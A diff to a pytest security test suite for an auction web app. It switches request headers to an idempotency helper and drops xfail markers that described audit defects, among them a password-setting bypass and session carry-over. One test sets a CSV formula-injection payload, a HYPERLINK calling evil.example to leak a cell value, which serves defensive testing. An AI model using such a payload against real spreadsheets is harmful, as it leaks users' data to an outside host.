@@ -27,6 +27,7 @@ from src.auction.rules import default_rules
 from tests.auction.helpers import make_pool
 from tests.auction.test_api_store import (  # noqa: F401 - fixture import
     ORIGIN,
+    idem,
     _cmd,
     _make_room,
     _owner_client,
@@ -65,7 +66,7 @@ def _invite(owner, room, seat=None, role="manager", handle=None, ttl=None):
         body["intendedHandle"] = handle
     if ttl is not None:
         body["ttlHours"] = ttl
-    r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=ORIGIN)
+    r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=idem())
     assert r.status_code == 200, r.text
     return r.json()["joinPath"].split("token=")[1]
 
@@ -75,7 +76,7 @@ def _claim(app, token, handle, password=None, client=None):
     r = c.post(
         "/api/auction/invites/claim",
         json={"token": token, "handle": handle, "password": password or PW.get(handle, "p" * 12)},
-        headers=ORIGIN,
+        headers=idem(),
     )
     return c, r
 
@@ -212,7 +213,7 @@ def test_closed_lot_exports_never_carry_the_winning_maximum(env):  # noqa: F811
     w = _world(env)
     room = w["room"]
     r = w["owner"].post(
-        f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=ORIGIN
+        f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=idem()
     )
     assert r.status_code == 200
     state, _, _ = w["st"].load(room)
@@ -385,7 +386,7 @@ def test_room_id_tampering_is_refused_everywhere(env):  # noqa: F811
             ("clock", {"advanceSeconds": 60}),
             ("clone", {}),
         ):
-            r = c.post(f"/api/auction/rooms/{other}/{path}", json=body, headers=ORIGIN)
+            r = c.post(f"/api/auction/rooms/{other}/{path}", json=body, headers=idem())
             assert r.status_code == 403, (who, path, r.text)
     # unknown rooms are 404, not a membership oracle for anything else
     assert w["alice"].get("/api/auction/rooms/r_doesnotexist/view").status_code == 404
@@ -404,11 +405,11 @@ def test_commissioner_member_ids_are_scoped_to_the_room(env):  # noqa: F811
         r = owner.post(
             f"/api/auction/rooms/{w['room']}/members/{carol_id}/{path}",
             json={"reason": "x"},
-            headers=ORIGIN,
+            headers=idem(),
         )
         assert r.status_code == 404, (path, r.text)
     # a manager cannot use another room's commissioner powers on carol either
-    r = w["alice"].post(f"/api/auction/rooms/{other}/members/{carol_id}/reset-link", headers=ORIGIN)
+    r = w["alice"].post(f"/api/auction/rooms/{other}/members/{carol_id}/reset-link", headers=idem())
     assert r.status_code == 403
     assert carol.get(f"/api/auction/rooms/{other}/view").status_code == 200
 
@@ -462,13 +463,13 @@ def test_manager_cannot_perform_any_commissioner_action(env):  # noqa: F811
         assert r.status_code == 403, (body, r.text)
     for method, url, body in _commissioner_routes(room, w["ids"]["bob"]):
         r = (
-            w["alice"].post(url, json=body, headers=ORIGIN)
+            w["alice"].post(url, json=body, headers=idem())
             if method == "post"
             else w["alice"].get(url)
         )
         assert r.status_code == 403, (url, r.text)
     # a manager cannot create rooms or mint a commissioner invite
-    assert w["alice"].post("/api/auction/rooms", json={}, headers=ORIGIN).status_code == 403
+    assert w["alice"].post("/api/auction/rooms", json={}, headers=idem()).status_code == 403
     assert st.load(room) == before
     with st.read() as conn:
         n = conn.execute("SELECT COUNT(*) FROM rooms").fetchone()[0]
@@ -483,13 +484,13 @@ def test_observer_cannot_mutate_anything(env):  # noqa: F811
         r = _cmd(w["obs"], room, body)
         assert r.status_code == 403, (body, r.text)
     for method, url, body in _commissioner_routes(room, w["ids"]["bob"]):
-        r = w["obs"].post(url, json=body, headers=ORIGIN) if method == "post" else w["obs"].get(url)
+        r = w["obs"].post(url, json=body, headers=idem()) if method == "post" else w["obs"].get(url)
         assert r.status_code == 403, (url, r.text)
     assert st.load(room) == before
     # The only room-scoped write an observer has is a PERSONAL watch toggle; it
     # does not touch room state or revision.
     r = w["obs"].post(
-        f"/api/auction/rooms/{room}/watch", json={"auction": w["aid"]}, headers=ORIGIN
+        f"/api/auction/rooms/{room}/watch", json={"auction": w["aid"]}, headers=idem()
     )
     assert r.status_code == 200 and st.load(room) == before
 
@@ -505,7 +506,7 @@ def test_commissioner_invite_cannot_mint_a_commissioner_or_seated_observer(env):
         {"role": "manager"},  # a manager invite must name a seat
         {"seat": "S99"},
     ):
-        r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=ORIGIN)
+        r = owner.post(f"/api/auction/rooms/{room}/invites", json=body, headers=idem())
         assert r.status_code in (400, 404), (body, r.text)
 
 
@@ -543,7 +544,7 @@ def test_invite_is_single_use_and_reissue_revokes_the_old_one(env):  # noqa: F81
     # the same token again — new account and existing account both refused
     _, r = _claim(app, new, "mallory")
     assert r.status_code == 404
-    r = alice.post("/api/auction/invites/claim", json={"token": new}, headers=ORIGIN)
+    r = alice.post("/api/auction/invites/claim", json={"token": new}, headers=idem())
     assert r.status_code == 404
 
 
@@ -560,7 +561,7 @@ def test_a_claimed_seat_cannot_be_claimed_twice(env):  # noqa: F811
         assert conn.execute("SELECT COUNT(*) FROM users WHERE handle='mallory'").fetchone()[0] == 0
     # alice cannot take a second seat with an invite either
     token = _invite(owner, room, seat="S4")
-    r = alice.post("/api/auction/invites/claim", json={"token": token}, headers=ORIGIN)
+    r = alice.post("/api/auction/invites/claim", json={"token": token}, headers=idem())
     assert r.status_code == 409 and r.json()["error"] == "already_member"
     assert alice.get(f"/api/auction/rooms/{room}/view").json()["me"]["seat"] == "S2"
 
@@ -573,7 +574,7 @@ def test_handle_locked_invite_refuses_other_handles_new_or_signed_in(env):  # no
     mallory, _ = _join(app, owner, other_room, "S2", "mallory")
     token = _invite(owner, room, seat="S3", handle="alice")
     # a signed-in account with a different handle
-    r = mallory.post("/api/auction/invites/claim", json={"token": token}, headers=ORIGIN)
+    r = mallory.post("/api/auction/invites/claim", json={"token": token}, headers=idem())
     assert r.status_code == 403 and r.json()["error"] == "invite_mismatch"
     # a brand-new account with a different handle
     _, r = _claim(app, token, "not-alice")
@@ -609,13 +610,13 @@ def test_knowing_a_sleeper_username_grants_nothing(env):  # noqa: F811
         r = attacker.post(
             "/api/auction/invites/claim",
             json={"token": sid, "handle": sid, "password": "p" * 12},
-            headers=ORIGIN,
+            headers=idem(),
         )
         assert r.status_code == 404
         r = attacker.post(
             "/api/auction/auth/login",
             json={"handle": sid, "password": sid},
-            headers=ORIGIN,
+            headers=idem(),
         )
         assert r.status_code == 401
     assert attacker.get("/api/auction/auth/me").json()["user"] is None
@@ -630,7 +631,7 @@ def test_knowing_a_sleeper_username_grants_nothing(env):  # noqa: F811
 
 
 def _reset_token(owner, room, uid):
-    r = owner.post(f"/api/auction/rooms/{room}/members/{uid}/reset-link", headers=ORIGIN)
+    r = owner.post(f"/api/auction/rooms/{room}/members/{uid}/reset-link", headers=idem())
     assert r.status_code == 200, r.text
     return r.json()["resetPath"].split("token=")[1]
 
@@ -643,7 +644,7 @@ def test_expired_reset_link_is_refused(env, monkeypatch):  # noqa: F811
     r = TestClient(w["app"]).post(
         "/api/auction/auth/reset",
         json={"token": token, "password": "new-pass-12345"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 404
     monkeypatch.setattr(api, "_now", lambda: real + 5)
@@ -658,21 +659,11 @@ def test_reissued_reset_link_voids_the_previous_one(env, monkeypatch):  # noqa: 
     second = _reset_token(w["owner"], w["room"], w["ids"]["alice"])
     c = TestClient(w["app"])
     body = {"token": first, "password": "new-pass-12345"}
-    assert c.post("/api/auction/auth/reset", json=body, headers=ORIGIN).status_code == 404
+    assert c.post("/api/auction/auth/reset", json=body, headers=idem()).status_code == 404
     body = {"token": second, "password": "new-pass-12345"}
-    assert c.post("/api/auction/auth/reset", json=body, headers=ORIGIN).status_code == 200
+    assert c.post("/api/auction/auth/reset", json=body, headers=idem()).status_code == 200
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (LOW): recovery.issue_reset keys the member's inbox record as "
-        "f'reset:{int(now)}' under UNIQUE(room_id, user_id, logical_key), so a second reset link "
-        "for the same member within the same second (double-click, retry - the route has no "
-        "Idempotency-Key) raises sqlite3.IntegrityError -> unhandled HTTP 500. Fix: use a "
-        "unique key (e.g. a token-hash prefix) or INSERT OR IGNORE."
-    ),
-)
 def test_reset_link_can_be_reissued_within_the_same_second(env, monkeypatch):  # noqa: F811
     w = _world(env)
     fixed = time.time()
@@ -680,8 +671,8 @@ def test_reset_link_can_be_reissued_within_the_same_second(env, monkeypatch):  #
     owner = TestClient(w["app"], raise_server_exceptions=False)
     owner.cookies.set(api.COOKIE_NAME, w["owner"].cookies.get(api.COOKIE_NAME))
     url = f"/api/auction/rooms/{w['room']}/members/{w['ids']['alice']}/reset-link"
-    assert owner.post(url, headers=ORIGIN).status_code == 200
-    assert owner.post(url, headers=ORIGIN).status_code == 200
+    assert owner.post(url, headers=idem()).status_code == 200
+    assert owner.post(url, headers=idem()).status_code == 200
 
 
 def test_reset_revokes_every_session_and_binds_only_its_own_account(env):  # noqa: F811
@@ -692,7 +683,7 @@ def test_reset_revokes_every_session_and_binds_only_its_own_account(env):  # noq
     r = alice2.post(
         "/api/auction/auth/login",
         json={"handle": "alice", "password": PW["alice"]},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200
     token = _reset_token(w["owner"], room, w["ids"]["alice"])
@@ -700,7 +691,7 @@ def test_reset_revokes_every_session_and_binds_only_its_own_account(env):  # noq
     r = w["bob"].post(
         "/api/auction/auth/reset",
         json={"token": token, "password": "bob-took-over-1"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200 and r.json()["user"]["handle"] == "alice"
     # both of alice's old sessions are dead, on every route
@@ -712,7 +703,7 @@ def test_reset_revokes_every_session_and_binds_only_its_own_account(env):  # noq
     # bob's own account is untouched: old password still works, new one does not
     for pw, code in ((PW["bob"], 200), ("bob-took-over-1", 401)):
         r = TestClient(app).post(
-            "/api/auction/auth/login", json={"handle": "bob", "password": pw}, headers=ORIGIN
+            "/api/auction/auth/login", json={"handle": "bob", "password": pw}, headers=idem()
         )
         assert r.status_code == code
     # the use is audited against alice's account, and alice's inbox recorded the issue
@@ -731,14 +722,14 @@ def test_reset_is_refused_for_non_members_and_removed_members(env):  # noqa: F81
     r = owner.post(
         f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
         json={"reason": "wrong person"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200
     r = owner.post(
-        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/reset-link", headers=ORIGIN
+        f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/reset-link", headers=idem()
     )
     assert r.status_code == 404
-    r = owner.post(f"/api/auction/rooms/{room}/members/999999/reset-link", headers=ORIGIN)
+    r = owner.post(f"/api/auction/rooms/{room}/members/999999/reset-link", headers=idem())
     assert r.status_code == 404
 
 
@@ -749,10 +740,11 @@ def test_replacement_keeps_the_seat_and_cuts_the_old_person_off_everywhere(env):
     r = owner.post(
         f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
         json={"reason": "lost account"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200 and r.json()["seat"] == "S2"
     after, _, _ = st.load(room)
+    after.pop("last_event_at"), before.pop("last_event_at")  # the public announcement
     assert after == before  # money, bids, lead belong to the SEAT
     alice = w["alice"]
     assert alice.get(f"/api/auction/rooms/{room}/view").status_code == 403
@@ -778,14 +770,6 @@ def test_replacement_keeps_the_seat_and_cuts_the_old_person_off_everywhere(env):
     assert "member_removed" in acts and acts.count("member_added") >= 5
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (LOW): recovery.remove_member records only an audit row. The removed "
-        "person gets no inbox record (unlike issue_reset) and the room gets no public event, "
-        "so neither the old participant nor the other managers are told the seat changed hands."
-    ),
-)
 def test_replacement_notifies_the_removed_person_and_the_room(env):  # noqa: F811
     w = _world(env)
     st, room = w["st"], w["room"]
@@ -793,7 +777,7 @@ def test_replacement_notifies_the_removed_person_and_the_room(env):  # noqa: F81
     w["owner"].post(
         f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
         json={"reason": "lost account"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     with st.read() as conn:
         told = conn.execute(
@@ -864,7 +848,7 @@ def test_logout_kills_the_session_server_side(env):  # noqa: F811
     w = _world(env)
     room = w["room"]
     stolen = w["alice"].cookies.get(api.COOKIE_NAME)
-    assert w["alice"].post("/api/auction/auth/logout", json={}, headers=ORIGIN).status_code == 200
+    assert w["alice"].post("/api/auction/auth/logout", json={}, headers=idem()).status_code == 200
     replay = TestClient(w["app"])
     replay.cookies.set(api.COOKIE_NAME, stolen)
     assert replay.get(f"/api/auction/rooms/{room}/view").status_code == 401
@@ -879,7 +863,7 @@ def _register(client, n=1):
     r = client.post(
         "/api/auction/notify/devices",
         json={"subscription": {"endpoint": f"{FCM}device-{n}", "keys": KEYS}, "label": "phone"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200, r.text
     return r.json()["deviceId"]
@@ -896,9 +880,9 @@ def test_logout_then_login_as_someone_else_carries_nothing_over(env):  # noqa: F
     phone = w["alice"]
     dev = _register(phone)
     assert dev in _live_ids(st, w["ids"]["alice"])
-    assert phone.post("/api/auction/auth/logout", json={}, headers=ORIGIN).status_code == 200
+    assert phone.post("/api/auction/auth/logout", json={}, headers=idem()).status_code == 200
     r = phone.post(
-        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=ORIGIN
+        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=idem()
     )
     assert r.status_code == 200
     v = phone.get(f"/api/auction/rooms/{room}/view").json()
@@ -909,25 +893,13 @@ def test_logout_then_login_as_someone_else_carries_nothing_over(env):  # noqa: F
     assert dev in _live_ids(st, w["ids"]["bob"]) and dev not in _live_ids(st, w["ids"]["alice"])
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (LOW-MEDIUM): /auth/login (also /auth/reset, /invites/claim for a new "
-        "account, /auth/site-owner) issues a new cookie without revoking the session in the "
-        "cookie it replaces. The previous account's session stays live server-side, so its "
-        "push device stays live and that account's alerts keep going to the browser the new "
-        "account is using until the client happens to call refreshBinding(). Fix: in "
-        "api.auth_login/auth_reset/invite_claim/auth_site_owner, revoke the presented "
-        "COOKIE_NAME session and notify.disable_devices_for_session() before _set_cookie()."
-    ),
-)
 def test_switching_accounts_without_logout_does_not_keep_the_old_push_binding(env):  # noqa: F811
     w = _world(env)
     st = w["st"]
     phone = w["alice"]
     dev = _register(phone)
     r = phone.post(
-        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=ORIGIN
+        "/api/auction/auth/login", json={"handle": "bob", "password": PW["bob"]}, headers=idem()
     )
     assert r.status_code == 200
     assert dev not in _live_ids(st, w["ids"]["alice"])
@@ -939,25 +911,25 @@ def test_device_endpoints_are_scoped_to_the_signed_in_account(env):  # noqa: F81
     alice_dev = _register(w["alice"], n=7)
     # bob cannot disable, test-send to, or confirm alice's device / outbox
     r = w["bob"].post(
-        "/api/auction/notify/devices/disable", json={"deviceId": alice_dev}, headers=ORIGIN
+        "/api/auction/notify/devices/disable", json={"deviceId": alice_dev}, headers=idem()
     )
     assert r.json()["disabled"] == 0
     r = w["bob"].post(
         "/api/auction/notify/devices/disable",
         json={"endpoint": f"{FCM}device-7"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.json()["disabled"] == 0
     assert alice_dev in _live_ids(st, w["ids"]["alice"])
-    r = w["bob"].post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=ORIGIN)
+    r = w["bob"].post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=idem())
     assert r.status_code == 409
     oid = (
         w["alice"]
-        .post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=ORIGIN)
+        .post("/api/auction/notify/test", json={"deviceId": alice_dev}, headers=idem())
         .json()["outboxIds"][0]
     )
     r = w["bob"].post(
-        "/api/auction/notify/test/confirm", json={"outboxId": oid, "seen": True}, headers=ORIGIN
+        "/api/auction/notify/test/confirm", json={"outboxId": oid, "seen": True}, headers=idem()
     )
     assert r.status_code == 404
     # bob's notify state lists only his own devices, and never an endpoint
@@ -966,7 +938,7 @@ def test_device_endpoints_are_scoped_to_the_signed_in_account(env):  # noqa: F81
     # marking alice's inbox rows read from bob's session changes nothing
     ids = [i["id"] for i in w["alice"].get("/api/auction/notify/inbox").json()["items"]]
     assert ids
-    w["bob"].post("/api/auction/notify/inbox/read", json={"ids": ids, "all": True}, headers=ORIGIN)
+    w["bob"].post("/api/auction/notify/inbox/read", json={"ids": ids, "all": True}, headers=idem())
     after = w["alice"].get("/api/auction/notify/inbox").json()
     assert after["unread"] == len(ids)
 
@@ -978,7 +950,7 @@ def test_seat_notifications_follow_the_seat_not_the_old_person(env):  # noqa: F8
     owner.post(
         f"/api/auction/rooms/{room}/members/{w['ids']['alice']}/remove",
         json={"reason": "lost account"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     dave, dave_id = _join(app, owner, room, "S2", "dave")
     # bob outbids S2 → the alert goes to dave (current holder), never alice
@@ -1029,7 +1001,7 @@ def test_only_mock_rooms_can_be_created(env, room_type):  # noqa: F811
     r = owner.post(
         "/api/auction/rooms",
         json={"roomType": room_type, "budgetSource": "equal", "seatSource": "generic"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     if room_type == "":
         # empty falls back to the default, which is mock
@@ -1104,16 +1076,16 @@ def test_mock_identities_and_tools_do_not_reach_an_official_room(env):  # noqa: 
     assert c.get(f"/api/auction/rooms/{official}/view").status_code == 403
     # mock-only tools refuse the official room even for its commissioner
     r = owner.post(
-        f"/api/auction/rooms/{official}/clock", json={"advanceSeconds": 60}, headers=ORIGIN
+        f"/api/auction/rooms/{official}/clock", json={"advanceSeconds": 60}, headers=idem()
     )
     assert r.status_code == 403
     # a clone is always a NEW MOCK; the source room is never promoted or touched
     before = st.load(official)
-    r = owner.post(f"/api/auction/rooms/{official}/clone", json={}, headers=ORIGIN)
+    r = owner.post(f"/api/auction/rooms/{official}/clone", json={}, headers=idem())
     assert r.status_code == 200
     assert st.load(r.json()["roomId"])[0]["room_type"] == "mock"
     assert st.load(official) == before
-    r = owner.post(f"/api/auction/rooms/{mock}/clone", json={}, headers=ORIGIN)
+    r = owner.post(f"/api/auction/rooms/{mock}/clone", json={}, headers=idem())
     assert st.load(r.json()["roomId"])[0]["room_type"] == "mock"
     assert st.load(mock)[0]["room_type"] == "mock"
 
@@ -1191,17 +1163,6 @@ _NON_COMMAND_MUTATIONS = [
 ]
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (LOW, doc/code mismatch): ROOKIE_AUCTION_ROOM.md §3 says 'Every mutation "
-        "requires ... an Idempotency-Key', but only POST /rooms/{id}/commands enforces it. "
-        "Room creation, invites, mock clock, clone, member removal/reset-link and notify/* "
-        "mutate without one, and a retried /clock advances the mock clock twice / a retried "
-        "/clone makes two rooms. Fix: enforce in api._mutation_guard (with a receipt table) or "
-        "narrow the §3 claim to room commands."
-    ),
-)
 @pytest.mark.parametrize("path,body", _NON_COMMAND_MUTATIONS)
 def test_every_mutation_requires_an_idempotency_key(env, path, body):  # noqa: F811
     w = _world(env)
@@ -1223,7 +1184,7 @@ def test_session_cookie_flags_on_every_issuing_route(env, monkeypatch):  # noqa:
     monkeypatch.delenv("JASON_AUTH_COOKIE_SECURE", raising=False)  # production default
     owner = TestClient(app)
     owner.cookies.set("jason_session", "site-admin")
-    responses = [owner.post("/api/auction/auth/site-owner", headers=ORIGIN)]
+    responses = [owner.post("/api/auction/auth/site-owner", headers=idem())]
     # re-attach the (Secure) cookie manually since TestClient speaks http
     tok = (
         responses[0].cookies.get(api.COOKIE_NAME)
@@ -1237,14 +1198,14 @@ def test_session_cookie_flags_on_every_issuing_route(env, monkeypatch):  # noqa:
         c.post(
             "/api/auction/invites/claim",
             json={"token": token, "handle": "alice", "password": PW["alice"]},
-            headers=ORIGIN,
+            headers=idem(),
         )
     )
     responses.append(
         TestClient(app).post(
             "/api/auction/auth/login",
             json={"handle": "alice", "password": PW["alice"]},
-            headers=ORIGIN,
+            headers=idem(),
         )
     )
     uid = responses[1].json()["user"]["id"]
@@ -1253,7 +1214,7 @@ def test_session_cookie_flags_on_every_issuing_route(env, monkeypatch):  # noqa:
         TestClient(app).post(
             "/api/auction/auth/reset",
             json={"token": reset, "password": "fresh-password-9"},
-            headers=ORIGIN,
+            headers=idem(),
         )
     )
     for resp in responses:
@@ -1279,13 +1240,13 @@ def test_no_password_or_token_is_ever_logged_stored_plain_or_returned(env, caplo
     token = _reset_token(owner, room, w["ids"]["bob"])
     new_pw = "brand-new-bob-pw-4"
     r = TestClient(w["app"]).post(
-        "/api/auction/auth/reset", json={"token": token, "password": new_pw}, headers=ORIGIN
+        "/api/auction/auth/reset", json={"token": token, "password": new_pw}, headers=idem()
     )
     assert r.status_code == 200
     r = w["alice"].post(
         "/api/auction/auth/password",
         json={"current": PW["alice"], "password": "alice-second-pw-5"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200 and r.json() == {"ok": True}
     secrets_ = [*PW.values(), new_pw, "alice-second-pw-5", token]
@@ -1310,51 +1271,38 @@ def test_password_change_requires_the_current_password_and_revokes_other_session
     app, room = w["app"], w["room"]
     other = TestClient(app)
     other.post(
-        "/api/auction/auth/login", json={"handle": "alice", "password": PW["alice"]}, headers=ORIGIN
+        "/api/auction/auth/login", json={"handle": "alice", "password": PW["alice"]}, headers=idem()
     )
     # a stolen session alone cannot rotate the password (persistence)
     r = w["alice"].post(
         "/api/auction/auth/password",
         json={"current": "wrong-guess-123", "password": "attacker-pw-123"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 403
     r = w["alice"].post(
         "/api/auction/auth/password",
         json={"current": PW["alice"], "password": "rotated-pw-1234"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 200
     assert other.get(f"/api/auction/rooms/{room}/view").status_code == 401
     assert w["alice"].get(f"/api/auction/rooms/{room}/view").status_code == 200
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (MEDIUM): the site-owner bridge account is documented as password-less "
-        "('this account signs in only through the site owner's session', accounts."
-        "get_or_create_site_owner; issue_reset refuses it), but accounts.change_password skips "
-        "the current-password check when pw_hash is NULL. Anyone holding the owner's 30-day "
-        "auction cookie can set a password with no proof and gain a permanent handle+password "
-        "login to the commissioner/site-admin account that bypasses the site's auth gate (and "
-        "survives later removal from PRIVATE_APP_ALLOWED_USERNAMES). Fix: refuse /auth/password "
-        "for site_username accounts (409 'site_account'), mirroring recovery.issue_reset."
-    ),
-)
 def test_site_owner_account_cannot_be_given_a_password_without_proof(env):  # noqa: F811
     st, app = env
     owner = _owner_client(app)
     r = owner.post(
         "/api/auction/auth/password",
         json={"current": "", "password": "stolen-cookie-pw-1"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code in (403, 409)
     r = TestClient(app).post(
         "/api/auction/auth/login",
         json={"handle": "owner", "password": "stolen-cookie-pw-1"},
-        headers=ORIGIN,
+        headers=idem(),
     )
     assert r.status_code == 401
 
@@ -1365,7 +1313,7 @@ def test_site_owner_bridge_requires_a_real_site_admin_session(env):  # noqa: F81
         c = TestClient(app)
         if cookie:
             c.cookies.set("jason_session", cookie)
-        r = c.post("/api/auction/auth/site-owner", headers=ORIGIN)
+        r = c.post("/api/auction/auth/site-owner", headers=idem())
         assert r.status_code == 403
     # an ordinary auction account is never a site admin
     owner = _owner_client(app)
@@ -1381,16 +1329,6 @@ def test_site_owner_bridge_requires_a_real_site_admin_session(env):  # noqa: F81
 # ---------------------------------------------------------------------------
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason=(
-        "AUDIT DEFECT (LOW): CSV export writes seat/team/player names verbatim. Seat names come "
-        "from league members' own Sleeper display names, so a manager named '=HYPERLINK(...)' "
-        "becomes a live formula when the commissioner opens auction-<room>-results.csv in "
-        "Excel/Sheets (CSV injection). Fix: in api.room_export prefix cells starting with "
-        "= + - @ TAB CR with a single quote."
-    ),
-)
 def test_csv_export_neutralises_spreadsheet_formulas(env):  # noqa: F811
     st, app = env
     evil = '=HYPERLINK("https://evil.example/?x="&A1,"click")'
@@ -1398,7 +1336,7 @@ def test_csv_export_neutralises_spreadsheet_formulas(env):  # noqa: F811
     owner = _owner_client(app)
     room = _ready_room(owner)
     _cmd(owner, room, {"kind": "nominate", "player": "991"})
-    owner.post(f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=ORIGIN)
+    owner.post(f"/api/auction/rooms/{room}/clock", json={"advanceSeconds": 3600}, headers=idem())
     text = owner.get(f"/api/auction/rooms/{room}/export?format=csv").text
     cells = [c for row in csv.reader(io.StringIO(text)) for c in row]
     assert evil in " ".join(cells) or any("HYPERLINK" in c for c in cells)
